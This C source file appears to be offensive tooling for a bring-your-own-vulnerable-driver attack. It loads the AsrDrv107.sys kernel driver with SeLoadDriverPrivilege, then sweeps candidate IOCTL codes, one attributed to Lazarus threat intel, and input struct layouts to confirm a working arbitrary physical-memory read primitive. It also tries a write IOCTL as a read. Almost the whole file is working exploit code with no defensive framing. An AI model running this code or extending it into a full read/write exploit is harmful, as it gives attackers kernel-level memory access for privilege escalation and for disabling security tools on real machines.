/*
 * asr_sweep.c -- AsrDrv107 IOCTL + struct size sweep
 * Confirms exact read IOCTL code and input struct size.
 * Build: clang asr_sweep.c -o asr_sweep.exe -lkernel32 -ladvapi32
 * Run as Admin: .\asr_sweep.exe ..\..\AsrDrv107.sys
 */
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define ASR_DEVICE   "\\\\.\\AsrDrv107"
#define ASR_SVC      "AsrDrv107"

/* candidate read IOCTLs from binary scan */
static const DWORD kReadCodes[] = {
    0x802AA058,   /* CMP scan hit: dev=0x802A fn=0x816 method=0 access=2 */
    0x9C406104,   /* Lazarus threat intel (may be wrong build)            */
    0x802A2058,   /* variants with different access bits                  */
    0x802A6058,
    0x802AE058,
    0x802AA054,
    0x802AA05C,
    0x802AA060,
};
#define N_READ  (sizeof(kReadCodes)/sizeof(kReadCodes[0]))

static BOOL svc_load(const char *abs)
{
    char nt[MAX_PATH+8];
    snprintf(nt, sizeof(nt)-1, "\\??\\%s", abs);

    SC_HANDLE scm = OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if (!scm) return FALSE;

    SC_HANDLE s = OpenServiceA(scm, ASR_SVC, SERVICE_ALL_ACCESS);
    if (s) {
        SERVICE_STATUS ss={0};
        ControlService(s,SERVICE_CONTROL_STOP,&ss);
        Sleep(300); DeleteService(s); CloseServiceHandle(s); Sleep(300);
    }
    s = CreateServiceA(scm,ASR_SVC,ASR_SVC,SERVICE_ALL_ACCESS,
                       SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,
                       SERVICE_ERROR_NORMAL,nt,NULL,NULL,NULL,NULL,NULL);
    if (!s) { CloseServiceHandle(scm); return FALSE; }
    BOOL ok = StartServiceA(s,0,NULL);
    if (!ok && GetLastError()==ERROR_SERVICE_ALREADY_RUNNING) ok=TRUE;
    CloseServiceHandle(s); CloseServiceHandle(scm);
    if (ok) Sleep(400);
    return ok;
}

static void svc_unload(void)
{
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if (!scm) return;
    SC_HANDLE s=OpenServiceA(scm,ASR_SVC,SERVICE_ALL_ACCESS);
    if (s) {
        SERVICE_STATUS ss={0};
        ControlService(s,SERVICE_CONTROL_STOP,&ss);
        Sleep(200); DeleteService(s); CloseServiceHandle(s);
    }
    CloseServiceHandle(scm);
}

int main(int argc, char **argv)
{
    const char *path = argc>1 ? argv[1] : "..\\..\\AsrDrv107.sys";
    char abs[MAX_PATH]={0};
    GetFullPathNameA(path,MAX_PATH,abs,NULL);

    printf("[*] AsrDrv107 struct sweep\n[*] driver: %s\n\n", abs);

    /* SeLoadDriverPrivilege */
    HANDLE ht=NULL;
    OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&ht);
    LUID luid; LookupPrivilegeValueA(NULL,"SeLoadDriverPrivilege",&luid);
    TOKEN_PRIVILEGES tp={1,{{luid,SE_PRIVILEGE_ENABLED}}};
    AdjustTokenPrivileges(ht,FALSE,&tp,sizeof(tp),NULL,NULL);
    CloseHandle(ht);

    if (!svc_load(abs)) { printf("[-] driver load failed: %lu\n",GetLastError()); return 1; }

    HANDLE dev = CreateFileA(ASR_DEVICE,
                              GENERIC_READ|GENERIC_WRITE,0,NULL,
                              OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if (dev==INVALID_HANDLE_VALUE) {
        printf("[-] open failed: %lu\n",GetLastError());
        svc_unload(); return 1;
    }
    printf("[+] handle: %p\n\n", (void*)dev);

    /*
     * Input buffer layout being tested:
     *   +0x00  uint64_t  PhysicalAddress  (we use 0x1000 -- IVT, always mapped)
     *   +0x08  uint32_t  UnitSize         (4)
     *   +0x0C  uint32_t  Count            (1)
     *   Total: 16 bytes
     *
     * We also test sizes 8, 12, 20, 24 in case struct differs.
     * Output buffer: 4 bytes to receive the read DWORD.
     */
    uint8_t  ibuf[32] = {0};
    uint64_t pa       = 0x1000ULL;
    memcpy(ibuf+0, &pa, 8);       /* PhysAddr */
    *(uint32_t*)(ibuf+8)  = 4;   /* UnitSize */
    *(uint32_t*)(ibuf+12) = 1;   /* Count    */

    DWORD    obuf = 0;
    DWORD    sizes[] = {8, 12, 16, 20, 24};

    printf("%-12s  %-6s  %-6s  %-10s  %s\n",
           "IOCTL","iSz","result","value","err");
    printf("%-12s  %-6s  %-6s  %-10s  %s\n",
           "-----","---","------","-----","---");

    int hits = 0;
    for (int ci=0; ci<(int)N_READ; ci++) {
        DWORD code = kReadCodes[ci];
        for (int si=0; si<(int)(sizeof(sizes)/sizeof(sizes[0])); si++) {
            DWORD isz = sizes[si];
            obuf = 0;
            DWORD ret = 0;
            BOOL ok = DeviceIoControl(dev, code,
                                       ibuf, isz,
                                       &obuf, sizeof(obuf),
                                       &ret, NULL);
            DWORD err = ok ? 0 : GetLastError();

            /* print ONLY non-87 results to avoid clutter */
            if (err != 87) {
                printf("0x%08lX  %-6lu  %-6s  0x%08lX  %lu",
                       (unsigned long)code, (unsigned long)isz,
                       ok?"OK":"FAIL",
                       (unsigned long)obuf,
                       (unsigned long)err);
                if (ok && obuf != 0) printf("  *** READ SUCCESS ***");
                else if (ok)         printf("  (zero -- maybe empty PA)");
                else if (err==31)    printf("  (err=31 struct OK, PA issue)");
                else if (err==5)     printf("  (access denied)");
                printf("\n");
                hits++;
            }
        }
    }

    if (!hits) {
        printf("\nAll returned error=87 -- trying alternate struct layouts...\n\n");

        /* Alt layout A: PA at start, no UnitSize/Count fields */
        printf("-- Alt A: {uint64 PA} only --\n");
        for (int ci=0; ci<(int)N_READ; ci++) {
            uint8_t alt[8]={0};
            memcpy(alt, &pa, 8);
            obuf=0; DWORD ret=0;
            BOOL ok=DeviceIoControl(dev,kReadCodes[ci],alt,8,&obuf,4,&ret,NULL);
            DWORD err=ok?0:GetLastError();
            if (err!=87)
                printf("  0x%08lX sz=8  %s  val=0x%08lX  err=%lu\n",
                       (unsigned long)kReadCodes[ci],ok?"OK":"FAIL",
                       (unsigned long)obuf,(unsigned long)err);
        }

        /* Alt layout B: {uint64 PA, uint32 size_in_bytes} = 12 bytes */
        printf("-- Alt B: {uint64 PA, uint32 ByteSize=4} --\n");
        for (int ci=0; ci<(int)N_READ; ci++) {
            uint8_t alt[12]={0};
            memcpy(alt, &pa, 8);
            *(uint32_t*)(alt+8)=4;
            obuf=0; DWORD ret=0;
            BOOL ok=DeviceIoControl(dev,kReadCodes[ci],alt,12,&obuf,4,&ret,NULL);
            DWORD err=ok?0:GetLastError();
            if (err!=87)
                printf("  0x%08lX sz=12  %s  val=0x%08lX  err=%lu\n",
                       (unsigned long)kReadCodes[ci],ok?"OK":"FAIL",
                       (unsigned long)obuf,(unsigned long)err);
        }

        /* Alt layout C: 0x802AA16E (write code) as read -- some drivers reuse */
        printf("-- Alt C: write code 0x802AA16E as read --\n");
        uint8_t alt3[16]={0};
        memcpy(alt3,&pa,8);
        *(uint32_t*)(alt3+8)=4;
        *(uint32_t*)(alt3+12)=1;
        obuf=0; DWORD ret=0;
        BOOL ok3=DeviceIoControl(dev,0x802AA16E,alt3,16,&obuf,4,&ret,NULL);
        DWORD err3=ok3?0:GetLastError();
        printf("  0x802AA16E sz=16  %s  val=0x%08lX  err=%lu\n",
               ok3?"OK":"FAIL",(unsigned long)obuf,(unsigned long)err3);
    }

    CloseHandle(dev);
    svc_unload();
    printf("\n[*] sweep done\n");
    return 0;
}